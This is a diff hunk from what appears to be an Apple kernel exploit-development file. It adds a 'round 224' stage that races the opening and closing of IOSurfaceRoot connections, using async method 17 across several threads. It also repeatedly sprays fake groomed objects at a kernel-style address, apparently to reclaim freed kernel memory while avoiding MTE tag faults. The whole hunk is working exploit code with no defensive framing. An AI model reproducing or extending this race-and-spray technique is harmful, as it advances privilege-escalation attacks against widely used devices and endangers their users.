@@ -26530,6 +26530,143 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
+            if (rounds == 224) {
+                rlog("\n=== r=224: Full-scale race WITH groom spray ===\n");
+
+                io_service_t svc224 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc224) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                /* Set up groom connection (like original Phase 13) */
+                io_connect_t groom224 = IO_OBJECT_NULL;
+                IOServiceOpen(svc224, mach_task_self(), 0, &groom224);
+                p13_groom_conn = groom224;
+
+                CFMutableDictionaryRef sp224 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w224 = 64, h224 = 64, bpe224 = 4, bpr224 = w224 * bpe224;
+                CFNumberRef wn224 = CFNumberCreate(NULL, kCFNumberIntType, &w224);
+                CFNumberRef hn224 = CFNumberCreate(NULL, kCFNumberIntType, &h224);
+                CFNumberRef bn224 = CFNumberCreate(NULL, kCFNumberIntType, &bpe224);
+                CFNumberRef rn224 = CFNumberCreate(NULL, kCFNumberIntType, &bpr224);
+                int pf224 = 0x42475241;
+                CFNumberRef pfn224 = CFNumberCreate(NULL, kCFNumberIntType, &pf224);
+                CFDictionarySetValue(sp224, CFSTR("IOSurfaceWidth"), wn224);
+                CFDictionarySetValue(sp224, CFSTR("IOSurfaceHeight"), hn224);
+                CFDictionarySetValue(sp224, CFSTR("IOSurfaceBytesPerElement"), bn224);
+                CFDictionarySetValue(sp224, CFSTR("IOSurfaceBytesPerRow"), rn224);
+                CFDictionarySetValue(sp224, CFSTR("IOSurfacePixelFormat"), pfn224);
+
+                uint64_t inp224[3] = {1, 2, 3};
+
+                /* Start render loop with 500ms warm-up (matching original Phase 13) */
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r224_rt;
+                pthread_create(&r224_rt, NULL, p13_render_loop, NULL);
+                usleep(500000);
+                rlog("  Render loop: frames=%d (500ms warm-up)\n", p13_render_frames);
+
+                /* v_race8 x20 with groom spray after each (like original Phase 13) */
+                rlog("  Phase A: v_race8 x20 + groom\n");
+                for (int vr = 0; vr < 20; vr++) {
+                    io_connect_t vcs[8]; int vhave[8];
+                    for (int i = 0; i < 8; i++) {
+                        vhave[i] = (IOServiceOpen(svc224, mach_task_self(), 0, &vcs[i]) == KERN_SUCCESS);
+                        if (vhave[i]) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xDEAD224000000000ULL | (vr << 8);
+                            IOConnectCallAsyncMethod(vcs[i], 17, twp, &ref, 1,
+                                NULL, 0, inp224, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        } else vcs[i] = IO_OBJECT_NULL;
+                    }
+                    p13_spam_run = 1;
+                    p13_spam_conn = vhave[0] ? vcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 0;
+                    p13_spam_count = 0;
+                    pthread_t vspam[8];
+                    for (int t = 0; t < 8; t++)
+                        pthread_create(&vspam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int r = 0; r < 3; r++)
+                        for (int i = 0; i < 8; i++) {
+                            int j = (i * 5 + r * 3) % 8;
+                            if (vhave[j]) { IOServiceClose(vcs[j]); vhave[j] = 0; }
+                            usleep(20 + (vr % 10) * 7);
+                        }
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 8; t++) pthread_join(vspam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (vhave[i]) IOServiceClose(vcs[i]);
+
+                    /* Groom spray (512 × sel1000, like original Phase 13) */
+                    p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+                    p13_free_groom();
+
+                    if (vr % 5 == 4)
+                        rlog("  v_race8[%d] spam=%llu frames=%d\n",
+                            vr, (unsigned long long)p13_spam_count, p13_render_frames);
+                }
+
+                /* v_big x15 with groom spray */
+                rlog("  Phase B: v_big x15 + groom\n");
+                for (int vb = 0; vb < 15; vb++) {
+                    IOSurfaceRef bigs[64];
+                    for (int i = 0; i < 64; i++) bigs[i] = IOSurfaceCreate(sp224);
+
+                    io_connect_t bcs[8]; int bhave[8];
+                    for (int i = 0; i < 8; i++) {
+                        bhave[i] = (IOServiceOpen(svc224, mach_task_self(), 0, &bcs[i]) == KERN_SUCCESS);
+                        if (bhave[i]) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xBBBB224000000000ULL | (vb << 8);
+                            IOConnectCallAsyncMethod(bcs[i], 17, twp, &ref, 1,
+                                NULL, 0, inp224, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        } else bcs[i] = IO_OBJECT_NULL;
+                    }
+                    p13_spam_run = 1;
+                    p13_spam_conn = bhave[0] ? bcs[0] : IO_OBJECT_NULL;
+                    p13_spam_count = 0;
+                    pthread_t bspam[6];
+                    for (int t = 0; t < 6; t++)
+                        pthread_create(&bspam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int i = 7; i >= 0; i--) {
+                        if (bhave[i]) { IOServiceClose(bcs[i]); bhave[i] = 0; }
+                        usleep(30);
+                    }
+                    for (int i = 0; i < 64; i++) if (bigs[i]) { CFRelease(bigs[i]); bigs[i] = NULL; }
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 6; t++) pthread_join(bspam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (bhave[i]) IOServiceClose(bcs[i]);
+
+                    p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+                    p13_free_groom();
+
+                    if (vb % 5 == 4)
+                        rlog("  v_big[%d] spam=%llu frames=%d\n",
+                            vb, (unsigned long long)p13_spam_count, p13_render_frames);
+                }
+
+                usleep(500000);
+                rlog("  SURVIVED full-scale race with groom: frames=%d\n", p13_render_frames);
+
+                p13_render_run = 0;
+                pthread_join(r224_rt, NULL);
+                if (groom224) { IOServiceClose(groom224); p13_groom_conn = IO_OBJECT_NULL; }
+                CFRelease(wn224); CFRelease(hn224); CFRelease(bn224); CFRelease(rn224); CFRelease(pfn224);
+                CFRelease(sp224);
+                IOObjectRelease(svc224);
+                rlog("=== r=224 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 223) {
                 rlog("\n=== r=223: Full-scale race + background reclaim spray ===\n");
 
